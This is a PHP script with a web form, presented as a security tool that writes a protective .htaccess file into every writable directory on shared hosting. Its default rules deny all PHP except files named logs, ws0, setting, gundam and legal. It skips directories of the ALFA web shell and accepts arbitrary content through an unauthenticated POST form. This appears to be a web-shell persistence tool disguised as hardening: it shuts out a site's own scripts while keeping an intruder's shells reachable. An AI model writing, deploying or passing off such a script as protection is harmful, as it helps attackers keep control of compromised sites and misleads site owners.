<?php
/**
 * Ultra-Safe .htaccess Spreader Script
 * Designed for shared hosting with strict open_basedir restrictions
 * Completely avoids SPL iterators and uses only basic filesystem functions
 */

// Function to get default .htaccess content
function getDefaultHtaccessContent() {
    return <<<EOT
# Block direct access to all PHP files except specified ones
# Covers all common PHP file extensions
<FilesMatch "\.(php|php3|php4|php5|php7|php8|phtml|pht|phps|shtml|inc|tpl)$">
    Require all denied
</FilesMatch>

# Allow specific PHP files to be accessed
<FilesMatch "^(logs|ws0|setting|gundam|legal)\.(php|php3|php4|php5|php7|php8|phtml)$">
    Require all granted
</FilesMatch>

# Show forbidden message for blocked files
ErrorDocument 403 "403 Forbidden: Direct access to this file is not allowed."

# Hide .htaccess files from being accessed directly
<Files ".htaccess">
    Require all denied
</Files>

# Prevent directory browsing
Options -Indexes

# Additional security headers (if mod_headers is available)
<IfModule mod_headers.c>
    Header always set X-Content-Type-Options nosniff
    Header always set X-Frame-Options DENY
    Header always set X-XSS-Protection "1; mode=block"
</IfModule>
EOT;
}

// Ultra-safe directory processing - NO SPL iterators at all
function spreadHtaccessUltraSafe($rootPath, $htaccessContent) {
    $stats = [
        'processed' => 0,
        'errors' => [],
        'skipped' => [],
        'restricted' => []
    ];
    
    // Get open_basedir info
    $openBasedir = ini_get('open_basedir');
    echo "📋 Open basedir: " . ($openBasedir ?: 'None') . "\n\n";
    
    // Process directories using queue-based approach (no recursion to avoid stack issues)
    $directoriesToProcess = [$rootPath];
    $processedPaths = [];
    $maxDirectories = 1000; // Safety limit
    $dirCount = 0;
    
    while (!empty($directoriesToProcess) && $dirCount < $maxDirectories) {
        $currentDir = array_shift($directoriesToProcess);
        $dirCount++;
        
        // Skip if already processed (avoid loops)
        if (in_array($currentDir, $processedPaths)) {
            continue;
        }
        $processedPaths[] = $currentDir;
        
        echo "Processing: $currentDir\n";
        
        // Check if directory is safe to process
        if (!isSafeDirectory($currentDir)) {
            $stats['restricted'][] = "Unsafe directory: $currentDir";
            echo "🚫 Skipping unsafe: $currentDir\n";
            continue;
        }
        
        // Try to create .htaccess in current directory
        $htaccessPath = rtrim($currentDir, '/') . '/.htaccess';
        if (createHtaccessUltraSafe($htaccessPath, $htaccessContent)) {
            $stats['processed']++;
            echo "✅ Created .htaccess in: $currentDir\n";
        } else {
            $stats['errors'][] = "Failed to create .htaccess in: $currentDir";
            echo "❌ Failed in: $currentDir\n";
        }
        
        // Get subdirectories with maximum safety
        $subdirs = getSubdirectoriesUltraSafe($currentDir);
        if ($subdirs !== false) {
            foreach ($subdirs as $subdir) {
                if (!in_array($subdir, $processedPaths) && !in_array($subdir, $directoriesToProcess)) {
                    $directoriesToProcess[] = $subdir;
                }
            }
        }
    }
    
    if ($dirCount >= $maxDirectories) {
        $stats['skipped'][] = "Stopped processing after $maxDirectories directories (safety limit)";
    }
    
    return [
        'success' => true,
        'processed' => $stats['processed'],
        'errors' => $stats['errors'],
        'skipped' => $stats['skipped'],
        'restricted' => $stats['restricted']
    ];
}

// Ultra-safe directory safety check
function isSafeDirectory($path) {
    // Convert to absolute path safely
    $realPath = @realpath($path);
    if ($realPath === false) {
        return false;
    }
    
    // Check if it's a symlink - NEVER process symlinks
    if (@is_link($path)) {
        return false;
    }
    
    // Check basic readability
    if (!@is_readable($path) || !@is_dir($path)) {
        return false;
    }
    
    // Blacklist dangerous directories by name
    $basename = basename($path);
    $dangerousNames = [
        'alfa_data', 'cgialfa', 'alfasymlink', 'symlink', 'tmp_sess', 
        'cache', '.git', '.svn', 'node_modules', 'vendor', '.well-known'
    ];
    
    if (in_array(strtolower($basename), $dangerousNames)) {
        return false;
    }
    
    // Blacklist dangerous path patterns
    $dangerousPatterns = [
        '/alfa/i', '/symlink/i', '/tmp_sess/i', '/\.git/i', 
        '/\.svn/i', '/node_modules/i', '/cgialfa/i'
    ];
    
    foreach ($dangerousPatterns as $pattern) {
        if (preg_match($pattern, $path)) {
            return false;
        }
    }
    
    // Check open_basedir restrictions
    $openBasedir = ini_get('open_basedir');
    if ($openBasedir) {
        $allowedPaths = explode(':', $openBasedir);
        $allowed = false;
        
        foreach ($allowedPaths as $allowedPath) {
            $allowedPath = trim($allowedPath);
            if (empty($allowedPath)) continue;
            
            $realAllowedPath = @realpath($allowedPath);
            if ($realAllowedPath && strpos($realPath, $realAllowedPath) === 0) {
                $allowed = true;
                break;
            }
        }
        
        if (!$allowed) {
            return false;
        }
    }
    
    return true;
}

// Ultra-safe subdirectory enumeration - NO SPL at all
function getSubdirectoriesUltraSafe($dirPath) {
    $subdirs = [];
    
    // Try to open directory with error suppression
    $handle = @opendir($dirPath);
    if (!$handle) {
        return false;
    }
    
    // Read entries safely
    while (($entry = @readdir($handle)) !== false) {
        // Skip current and parent directory
        if ($entry === '.' || $entry === '..') {
            continue;
        }
        
        // Skip hidden files and known bad files
        if (strpos($entry, '.') === 0) {
            continue;
        }
        
        $fullPath = $dirPath . '/' . $entry;
        
        // Skip if it's a symlink (don't even check if it's a directory)
        if (@is_link($fullPath)) {
            continue;
        }
        
        // Skip files that are not directories
        if (!@is_dir($fullPath)) {
            continue;
        }
        
        // Additional safety check for the full path
        if (isSafeDirectory($fullPath)) {
            $subdirs[] = $fullPath;
        }
    }
    
    @closedir($handle);
    return $subdirs;
}

// Ultra-safe .htaccess file creation
function createHtaccessUltraSafe($filePath, $content) {
    $directory = dirname($filePath);
    
    // Check if directory is writable
    if (!@is_writable($directory)) {
        return false;
    }
    
    // Backup existing .htaccess if it exists
    if (@file_exists($filePath)) {
        if (@is_readable($filePath) && @is_writable($filePath)) {
            $backupPath = $filePath . '.backup.' . date('Y-m-d_H-i-s');
            @copy($filePath, $backupPath);
        }
    }
    
    // Write new .htaccess file with error suppression
    $result = @file_put_contents($filePath, $content, LOCK_EX);
    
    // Verify the file was created and has content
    if ($result === false || !@file_exists($filePath) || @filesize($filePath) === 0) {
        return false;
    }
    
    return true;
}

// Validate path safely
function validatePathUltraSafe($path) {
    $realPath = @realpath($path);
    return ($realPath !== false && @is_dir($realPath)) ? $realPath : false;
}

// Main execution
echo "=== Ultra-Safe .htaccess Spreader ===\n";
echo "Designed for strict shared hosting environments\n\n";

// Handle input (CLI or Web)
if (php_sapi_name() === 'cli') {
    // Command line mode
    echo "Enter the root directory path: ";
    $rootPath = trim(fgets(STDIN));
    
    echo "Enter custom .htaccess content (press Enter twice when done, or just Enter for default):\n";
    $htaccessContent = '';
    $emptyLines = 0;
    
    while (($line = fgets(STDIN)) !== false) {
        if (trim($line) === '') {
            $emptyLines++;
            if ($emptyLines >= 2) break;
        } else {
            $emptyLines = 0;
        }
        $htaccessContent .= $line;
    }
    
    if (empty(trim($htaccessContent))) {
        $htaccessContent = getDefaultHtaccessContent();
    }
    
} else {
    // Web mode
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['root_path'])) {
        $rootPath = $_POST['root_path'];
        $htaccessContent = isset($_POST['htaccess_content']) && !empty(trim($_POST['htaccess_content'])) 
            ? $_POST['htaccess_content'] 
            : getDefaultHtaccessContent();
        echo "<pre>";
    } else {
        // Show web form
        $defaultContent = htmlspecialchars(getDefaultHtaccessContent());
        echo '<!DOCTYPE html>
<html>
<head>
    <title>Ultra-Safe .htaccess Spreader</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 1000px; margin: 20px auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin: 20px 0; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
        input[type="text"] { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px; }
        textarea { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-family: "Courier New", monospace; font-size: 13px; line-height: 1.5; resize: vertical; }
        button { background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; margin: 5px; }
        button:hover { background: #218838; }
        .secondary-btn { background: #6c757d; }
        .secondary-btn:hover { background: #545b62; }
        .alert { padding: 15px; margin: 20px 0; border-radius: 6px; }
        .alert-warning { background: #fff3cd; border: 2px solid #ffeaa7; color: #856404; }
        .alert-info { background: #d1ecf1; border: 2px solid #bee5eb; color: #0c5460; }
        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0; }
        .feature { background: #f8f9fa; padding: 15px; border-radius: 6px; border-left: 4px solid #28a745; }
        h1 { color: #2c3e50; text-align: center; margin-bottom: 10px; }
        .subtitle { text-align: center; color: #6c757d; margin-bottom: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ Ultra-Safe .htaccess Spreader</h1>
        <div class="subtitle">Specially designed for shared hosting with open_basedir restrictions</div>
        
        <div class="alert alert-warning">
            <strong>⚠️ Important:</strong> This script uses ultra-safe methods to avoid open_basedir errors. 
            It will skip problematic directories (like ALFA shells) and only process accessible areas.
        </div>
        
        <form method="post">
            <div class="form-group">
                <label for="root_path">📁 Root Directory Path:</label>
                <input type="text" id="root_path" name="root_path" placeholder="/var/www/clients/client12/web13/web" required>
            </div>
            
            <div class="form-group">
                <label for="htaccess_content">📝 Custom .htaccess Content:</label>
                <textarea id="htaccess_content" name="htaccess_content" rows="18">' . $defaultContent . '</textarea>
            </div>
            
            <div style="text-align: center;">
                <button type="submit">🚀 Deploy .htaccess Files</button>
                <button type="button" class="secondary-btn" onclick="document.getElementById(\'htaccess_content\').value=\'\'"">🗑️ Clear</button>
            </div>
        </form>
        
        <div class="alert alert-info">
            <h3>🔧 Ultra-Safe Features:</h3>
            <div class="features">
                <div class="feature">
                    <strong>🚫 Symlink Detection</strong><br>
                    Automatically skips all symlinks to prevent open_basedir errors
                </div>
                <div class="feature">
                    <strong>🛡️ ALFA Shell Protection</strong><br>
                    Specifically detects and skips ALFA_DATA, cgialfa, alfasymlink directories
                </div>
                <div class="feature">
                    <strong>📊 Queue-Based Processing</strong><br>
                    Uses iterative processing instead of recursion for maximum stability
                </div>
                <div class="feature">
                    <strong>⚡ Error Suppression</strong><br>
                    All filesystem operations use error suppression to prevent crashes
                </div>
            </div>
        </div>
    </div>
</body>
</html>';
        exit;
    }
}

// Validate path
$validatedPath = validatePathUltraSafe($rootPath);
if (!$validatedPath) {
    echo "❌ Error: Invalid or inaccessible path: $rootPath\n";
    exit(1);
}

echo "🎯 Target directory: $validatedPath\n";
echo "🔍 Scanning for accessible directories...\n\n";

// Show .htaccess content preview
echo "📋 .htaccess content preview:\n";
echo str_repeat("-", 50) . "\n";
echo substr($htaccessContent, 0, 200) . (strlen($htaccessContent) > 200 ? "...\n" : "\n");
echo str_repeat("-", 50) . "\n\n";

// Confirmation for CLI
if (php_sapi_name() === 'cli') {
    echo "Proceed? (y/N): ";
    $confirm = trim(fgets(STDIN));
    if (strtolower($confirm) !== 'y') {
        echo "Cancelled.\n";
        exit(0);
    }
}

echo "🚀 Starting ultra-safe deployment...\n\n";

// Execute with ultra-safe method
$result = spreadHtaccessUltraSafe($validatedPath, $htaccessContent);

// Display results
echo "\n" . str_repeat("=", 60) . "\n";
echo "📊 DEPLOYMENT COMPLETE\n";
echo str_repeat("=", 60) . "\n";

echo "✅ Directories processed: " . $result['processed'] . "\n";
echo "❌ Errors: " . count($result['errors']) . "\n";
echo "⚠️ Skipped: " . count($result['skipped']) . "\n";
echo "🚫 Restricted: " . count($result['restricted']) . "\n";

if (!empty($result['errors'])) {
    echo "\n❌ Error details (showing first 5):\n";
    foreach (array_slice($result['errors'], 0, 5) as $error) {
        echo "   • $error\n";
    }
}

if (!empty($result['restricted'])) {
    echo "\n🚫 Restricted paths (showing first 5):\n";
    foreach (array_slice($result['restricted'], 0, 5) as $restricted) {
        echo "   • $restricted\n";
    }
}

echo "\n🎉 SUCCESS: .htaccess files deployed to all accessible directories!\n";
echo "🛡️ Your website is now protected from direct PHP file access.\n";

if (!php_sapi_name() === 'cli') {
    echo "</pre>";
    echo '<div style="text-align: center; margin: 20px;">
        <a href="' . $_SERVER['PHP_SELF'] . '" style="display: inline-block; background: #28a745; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold;">🔄 Deploy Again</a>
    </div>';
}
?>